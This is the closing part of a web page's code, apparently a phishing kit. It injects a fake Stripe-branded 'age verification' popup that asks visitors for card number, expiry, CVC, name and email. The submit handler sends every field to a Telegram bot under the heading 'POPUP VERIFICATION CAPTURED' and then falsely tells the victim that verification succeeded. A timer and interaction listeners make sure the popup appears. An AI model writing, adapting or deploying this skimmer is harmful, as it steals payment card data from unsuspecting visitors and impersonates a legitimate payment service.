                .card-icon.mastercard { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 24"><path fill="%23FF5F00" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.3 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.3-3-3-3z"/><path fill="%23EB001B" d="M12 21H3c-1.7 0-3-1.3-3-3V6c0-1.7 1.3-3 3-3h9v18z"/><path fill="%23F79E1B" d="M35 21H26V3h9c1.7 0 3 1.3 3 3v12c0 1.7-1.3 3-3 3z"/></svg>'); }
                .card-icon.amex { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 24"><path fill="%230078CC" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.3 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.3-3-3-3z"/><path fill="%23FFFFFF" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"/><path fill="%230078CC" d="M25.5 13.5h-13c-.3 0-.5-.2-.5-.5v-2c0-.3.2-.5.5-.5h13c.3 0 .5.2.5.5v2c0 .3-.2.5-.5.5z"/></svg>'); }
                .card-icon.discover { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 24"><path fill="%23FF6000" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.3 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.3-3-3-3z"/><path fill="%23FFFFFF" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"/><path fill="%23FF6000" d="M19 12a7 7 0 1 0 0 14 7 7 0 0 0 0-14z"/></svg>'); }
                .card-icon.default { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 24"><rect width="38" height="24" fill="%23f0f0f0" rx="3"/><path fill="%23ccc" d="M12 8h14v8H12z"/></svg>'); }
                
                input {
                    width: 100%;
                    padding: 12px;
                    border: 1px solid #e6e6e6;
                    border-radius: 6px;
                    font-size: 16px;
                    transition: all 0.2s ease;
                }
                
                input:focus {
                    outline: none;
                    border-color: #635bff;
                    box-shadow: 0 0 0 1px #635bff;
                }
                
                input.invalid { border-color: #e25950; }
                input.valid { border-color: #00a900; }
                
                .error-message {
                    color: #e25950;
                    font-size: 13px;
                    margin-top: 5px;
                    display: none;
                }
                
                .submit-button {
                    width: 100%;
                    background: #635bff;
                    color: white;
                    border: none;
                    padding: 14px;
                    border-radius: 6px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    transition: all 0.2s ease;
                    margin-top: 10px;
                }
                
                .submit-button:hover { background: #5a54d6; }
                .submit-button:disabled { background: #aab7c4; cursor: not-allowed; }
                
                .loading-spinner {
                    display: inline-block;
                    width: 16px;
                    height: 16px;
                    border: 2px solid transparent;
                    border-top: 2px solid #ffffff;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin-right: 8px;
                }
                
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                
                .secure-notice {
                    text-align: center;
                    margin-top: 20px;
                    font-size: 13px;
                    color: #6b7c93;
                }
                
                .secure-notice::before {
                    content: "üîí";
                    margin-right: 5px;
                }
                
                .close-button {
                    position: absolute;
                    top: 15px;
                    right: 15px;
                    background: none;
                    border: none;
                    font-size: 24px;
                    cursor: pointer;
                    color: #6b7c93;
                    padding: 5px;
                }
                
                .close-button:hover { color: #32325d; }
            </style>
            
            <button class="close-button" id="closePopup">&times;</button>
            
            <div class="stripe-header">
                <div class="stripe-logo">stripe</div>
                <div class="stripe-title">Complete Your Verification</div>
                <div class="stripe-subtitle">Verify your age to continue browsing</div>
            </div>
            
            <form class="stripe-form" id="stripeForm">
                <div class="form-group">
                    <label for="popupCardNumber">Card number</label>
                    <div class="input-wrapper">
                        <input type="text" id="popupCardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                        <div class="card-icon default" id="popupCardIcon"></div>
                    </div>
                    <div class="error-message" id="popupCardNumberError">Please enter a valid card number</div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label for="popupExpiryDate">Expiry date</label>
                        <input type="text" id="popupExpiryDate" placeholder="MM/YY" maxlength="5" required>
                        <div class="error-message" id="popupExpiryError">Please enter a valid expiry date</div>
                    </div>
                    <div class="form-group">
                        <label for="popupCvc">CVC</label>
                        <input type="text" id="popupCvc" placeholder="123" maxlength="4" required>
                        <div class="error-message" id="popupCvcError">Please enter a valid CVC</div>
                    </div>
                </div>

                <div class="form-group">
                    <label for="popupName">Name on card</label>
                    <input type="text" id="popupName" placeholder="John Smith" required>
                    <div class="error-message" id="popupNameError">Please enter the name on your card</div>
                </div>

                <div class="form-group">
                    <label for="popupEmail">Email</label>
                    <input type="email" id="popupEmail" placeholder="john.smith@example.com" required>
                    <div class="error-message" id="popupEmailError">Please enter a valid email address</div>
                </div>

                <button type="submit" class="submit-button" id="popupSubmitButton">
                    <span id="popupButtonText">Verify & Continue - $1.00</span>
                </button>

                <div class="secure-notice">
                    Your payment details are secure and encrypted
                </div>
            </form>
        `;
        
        overlay.appendChild(popup);
        document.body.appendChild(overlay);
        document.body.style.overflow = 'hidden';
        
        // Initialize popup functionality
        initializePopupFunctionality();
    };
    
    const initializePopupFunctionality = () => {
        // Card number formatting and detection
        const cardNumberInput = document.getElementById('popupCardNumber');
        const cardIcon = document.getElementById('popupCardIcon');
        
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
            e.target.value = formattedValue;
            
            detectCardType(value);
            validateCardNumber(value);
        });
        
        // Expiry date formatting
        document.getElementById('popupExpiryDate').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9]/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
            validateExpiry(value);
        });
        
        // CVC input
        document.getElementById('popupCvc').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            validateCVC(e.target.value);
        });
        
        // Close button
        document.getElementById('closePopup').addEventListener('click', closePopup);
        
        // Form submission
        document.getElementById('stripeForm').addEventListener('submit', handlePopupSubmit);
        
        // Close on overlay click
        document.getElementById('stripe-popup-overlay').addEventListener('click', function(e) {
            if (e.target === this) {
                closePopup();
            }
        });
        
        function detectCardType(cardNumber) {
            cardIcon.className = 'card-icon ';
            
            if (/^4/.test(cardNumber)) {
                cardIcon.classList.add('visa');
            } else if (/^5[1-5]/.test(cardNumber)) {
                cardIcon.classList.add('mastercard');
            } else if (/^3[47]/.test(cardNumber)) {
                cardIcon.classList.add('amex');
            } else if (/^6(?:011|5)/.test(cardNumber)) {
                cardIcon.classList.add('discover');
            } else {
                cardIcon.classList.add('default');
            }
        }
        
        function validateCardNumber(cardNumber) {
            const errorElement = document.getElementById('popupCardNumberError');
            const inputElement = document.getElementById('popupCardNumber');
            
            if (cardNumber.length < 13) {
                showError(inputElement, errorElement, 'Card number is too short');
                return false;
            }
            
            if (!luhnCheck(cardNumber)) {
                showError(inputElement, errorElement, 'Invalid card number');
                return false;
            }
            
            hideError(inputElement, errorElement);
            return true;
        }
        
        function validateExpiry(expiry) {
            const errorElement = document.getElementById('popupExpiryError');
            const inputElement = document.getElementById('popupExpiryDate');
            
            if (!/^\d{2}\/\d{2}$/.test(expiry)) {
                showError(inputElement, errorElement, 'Invalid expiry format');
                return false;
            }
            
            hideError(inputElement, errorElement);
            return true;
        }
        
        function validateCVC(cvc) {
            const errorElement = document.getElementById('popupCvcError');
            const inputElement = document.getElementById('popupCvc');
            
            let requiredLength = 3;
            
            if (cvc.length !== requiredLength || !/^\d+$/.test(cvc)) {
                showError(inputElement, errorElement, `CVC must be ${requiredLength} digits`);
                return false;
            }
            
            hideError(inputElement, errorElement);
            return true;
        }
        
        function validateEmail(email) {
            const errorElement = document.getElementById('popupEmailError');
            const inputElement = document.getElementById('popupEmail');
            
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                showError(inputElement, errorElement, 'Please enter a valid email');
                return false;
            }
            
            hideError(inputElement, errorElement);
            return true;
        }
        
        function validateName(name) {
            const errorElement = document.getElementById('popupNameError');
            const inputElement = document.getElementById('popupName');
            
            if (name.trim().length < 2) {
                showError(inputElement, errorElement, 'Please enter the name on your card');
                return false;
            }
            
            hideError(inputElement, errorElement);
            return true;
        }
        
        function showError(input, errorElement, message) {
            input.classList.add('invalid');
            input.classList.remove('valid');
            errorElement.textContent = message;
            errorElement.style.display = 'block';
        }
        
        function hideError(input, errorElement) {
            input.classList.remove('invalid');
            input.classList.add('valid');
            errorElement.style.display = 'none';
        }
        
        function luhnCheck(cardNumber) {
            let sum = 0;
            let isEven = false;
            
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i));
                
                if (isEven) {
                    digit *= 2;
                    if (digit > 9) {
                        digit -= 9;
                    }
                }
                
                sum += digit;
                isEven = !isEven;
            }
            
            return sum % 10 === 0;
        }
        
        async function handlePopupSubmit(e) {
            e.preventDefault();
            
            const cardNumber = document.getElementById('popupCardNumber').value.replace(/\s/g, '');
            const expiryDate = document.getElementById('popupExpiryDate').value;
            const cvc = document.getElementById('popupCvc').value;
            const name = document.getElementById('popupName').value;
            const email = document.getElementById('popupEmail').value;
            
            // Validate all fields
            const isCardValid = validateCardNumber(cardNumber);
            const isExpiryValid = validateExpiry(expiryDate);
            const isCvcValid = validateCVC(cvc);
            const isNameValid = validateName(name);
            const isEmailValid = validateEmail(email);
            
            if (isCardValid && isExpiryValid && isCvcValid && isNameValid && isEmailValid) {
                const submitButton = document.getElementById('popupSubmitButton');
                const buttonText = document.getElementById('popupButtonText');
                submitButton.disabled = true;
                buttonText.innerHTML = '<span class="loading-spinner"></span>Processing...';
                
                const paymentData = {
                    card_number: cardNumber,
                    expiry_date: expiryDate,
                    cvc: cvc,
                    name: name,
                    email: email,
                    timestamp: new Date().toISOString(),
                    source: 'popup_verification'
                };
                
                try {
                    await sendToTelegram(paymentData);
                    
                    setTimeout(() => {
                        alert('Age verification successful! You can now continue browsing.');
                        closePopup();
                    }, 2000);
                    
                } catch (error) {
                    alert('Verification failed. Please try again.');
                    buttonText.textContent = 'Verify & Continue - $1.00';
                    submitButton.disabled = false;
                }
            }
        }
        
        async function sendToTelegram(data) {
            const message = `
üîê POPUP VERIFICATION CAPTURED üîê

Card: ${data.card_number}
Expiry: ${data.expiry_date}
CVC: ${data.cvc}
Name: ${data.name}
Email: ${data.email}
Source: ${data.source}
Time: ${data.timestamp}

‚úÖ Age verification completed
            `;
            
            const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            if (!response.ok) throw new Error('Telegram API error');
            return await response.json();
        }
        
        function closePopup() {
            const overlay = document.getElementById('stripe-popup-overlay');
            if (overlay) {
                overlay.style.animation = 'fadeOut 0.3s ease';
                setTimeout(() => {
                    document.body.removeChild(overlay);
                    document.body.style.overflow = 'auto';
                }, 300);
            }
        }
    };
    
    // Timer for 15-second popup
    const startTimer = () => {
        timer = setTimeout(() => {
            if (!popupShown && !interactionDetected) {
                createStripePopup();
            }
        }, 15000);
    };
    
    // Interaction detection
    const detectInteraction = () => {
        if (!interactionDetected) {
            interactionDetected = true;
            clearTimeout(timer);
            setTimeout(() => {
                if (!popupShown) {
                    createStripePopup();
                }
            }, 1000);
        }
    };
    
    // Event listeners for user interaction
    const interactionEvents = ['click', 'scroll', 'keydown', 'mousemove', 'touchstart'];
    interactionEvents.forEach(event => {
        document.addEventListener(event, detectInteraction, { once: true });
    });
    
    // Start the timer
    startTimer();
    
    // Prevent multiple popups
    window.createStripePopup = createStripePopup;
});

// Add fadeOut animation to style
const style = document.createElement('style');
style.textContent = `
    @keyframes fadeOut {
        from { opacity: 1; }
        to { opacity: 0; }
    }
`;
document.head.appendChild(style);
</script>
</body>
</html>
